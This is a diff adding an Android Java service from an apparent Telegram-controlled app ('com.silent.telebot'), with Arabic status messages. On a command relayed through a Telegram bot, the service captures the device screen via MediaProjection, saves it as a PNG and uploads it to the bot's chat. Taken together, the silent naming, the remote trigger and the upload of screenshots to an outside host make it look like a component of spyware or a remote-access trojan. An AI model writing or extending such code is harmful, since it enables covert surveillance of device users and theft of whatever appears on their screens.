@@ -1,0 +1,143 @@
+package com.silent.telebot;
+
+import android.app.Service;
+import android.content.Context;
+import android.content.Intent;
+import android.graphics.Bitmap;
+import android.graphics.PixelFormat;
+import android.hardware.display.DisplayManager;
+import android.hardware.display.VirtualDisplay;
+import android.media.Image;
+import android.media.ImageReader;
+import android.media.projection.MediaProjection;
+import android.media.projection.MediaProjectionManager;
+import android.os.Build;
+import android.os.IBinder;
+import android.util.Log;
+
+import java.io.File;
+import java.io.FileOutputStream;
+import java.nio.ByteBuffer;
+
+public class ScreenCaptureService extends Service {
+    private static final String TAG = "ScreenCaptureService";
+    private static int resultCode = -1;
+    private static Intent resultData = null;
+    private MediaProjection mediaProjection;
+    private VirtualDisplay virtualDisplay;
+    private ImageReader imageReader;
+
+    public static void setResultData(int code, Intent data) {
+        resultCode = code;
+        resultData = data;
+    }
+
+    public static void takeScreenshot(Context context, String chatId, String botToken) {
+        if (resultData == null || resultCode == -1) {
+            TelegramPoller.sendMessageStatic(chatId, "❌ صلاحية لقطة الشاشة غير مفعلة. الرجاء فتح التطبيق والموافقة على النافذة المنبثقة.");
+            return;
+        }
+        try {
+            Intent serviceIntent = new Intent(context, ScreenCaptureService.class);
+            serviceIntent.putExtra("chatId", chatId);
+            serviceIntent.putExtra("botToken", botToken);
+            context.startService(serviceIntent);
+        } catch (Exception e) {
+            TelegramPoller.sendMessageStatic(chatId, "❌ فشل بدء خدمة لقطة الشاشة: " + e.getMessage());
+        }
+    }
+
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
+        if (intent == null) return START_STICKY;
+        String chatId = intent.getStringExtra("chatId");
+        String botToken = intent.getStringExtra("botToken");
+        if (chatId == null || botToken == null) {
+            stopSelf();
+            return START_NOT_STICKY;
+        }
+        new Thread(() -> {
+            try {
+                captureScreen(chatId, botToken);
+            } catch (Exception e) {
+                TelegramPoller.sendMessageStatic(chatId, "❌ خطأ: " + e.getMessage());
+            } finally {
+                stopSelf();
+            }
+        }).start();
+        return START_STICKY;
+    }
+
+    private void captureScreen(String chatId, String botToken) {
+        try {
+            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
+                TelegramPoller.sendMessageStatic(chatId, "❌ نظامك لا يدعم لقطة الشاشة.");
+                return;
+            }
+            MediaProjectionManager projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
+            if (projectionManager == null || resultData == null) {
+                TelegramPoller.sendMessageStatic(chatId, "❌ صلاحية غير مفعلة.");
+                return;
+            }
+            mediaProjection = projectionManager.getMediaProjection(resultCode, resultData);
+            if (mediaProjection == null) {
+                TelegramPoller.sendMessageStatic(chatId, "❌ فشل MediaProjection.");
+                return;
+            }
+
+            int width = 1080, height = 1920, density = getResources().getDisplayMetrics().densityDpi;
+            imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 1);
+            virtualDisplay = mediaProjection.createVirtualDisplay("ScreenCapture", width, height, density,
+                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, imageReader.getSurface(), null, null);
+
+            Thread.sleep(500);
+            Image image = imageReader.acquireLatestImage();
+            if (image == null) {
+                TelegramPoller.sendMessageStatic(chatId, "❌ صورة فارغة.");
+                return;
+            }
+
+            Image.Plane[] planes = image.getPlanes();
+            ByteBuffer buffer = planes[0].getBuffer();
+            int pixelStride = planes[0].getPixelStride();
+            int rowStride = planes[0].getRowStride();
+            int rowPadding = rowStride - pixelStride * width;
+
+            Bitmap bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888);
+            bitmap.copyPixelsFromBuffer(buffer);
+            Bitmap finalBitmap = Bitmap.createBitmap(bitmap, 0, 0, width, height);
+            bitmap.recycle();
+
+            File screenshotFile = new File(getCacheDir(), "screenshot.png");
+            FileOutputStream fos = new FileOutputStream(screenshotFile);
+            finalBitmap.compress(Bitmap.CompressFormat.PNG, 100, fos);
+            fos.flush();
+            fos.close();
+            finalBitmap.recycle();
+            image.close();
+
+            TelegramPoller.sendPhotoStatic(chatId, screenshotFile, botToken);
+
+            if (virtualDisplay != null) virtualDisplay.release();
+            if (mediaProjection != null) mediaProjection.stop();
+            if (imageReader != null) imageReader.close();
+
+        } catch (Exception e) {
+            TelegramPoller.sendMessageStatic(chatId, "❌ فشل الالتقاط: " + e.getMessage());
+            Log.e(TAG, "Error: " + e.getMessage());
+        } finally {
+            stopSelf();
+        }
+    }
+
+    @Override
+    public void onDestroy() {
+        super.onDestroy();
+        if (virtualDisplay != null) virtualDisplay.release();
+        if (mediaProjection != null) mediaProjection.stop();
+        if (imageReader != null) imageReader.close();
+    }
+
+    @Override
+    public IBinder onBind(Intent intent) { return null; }
+  }
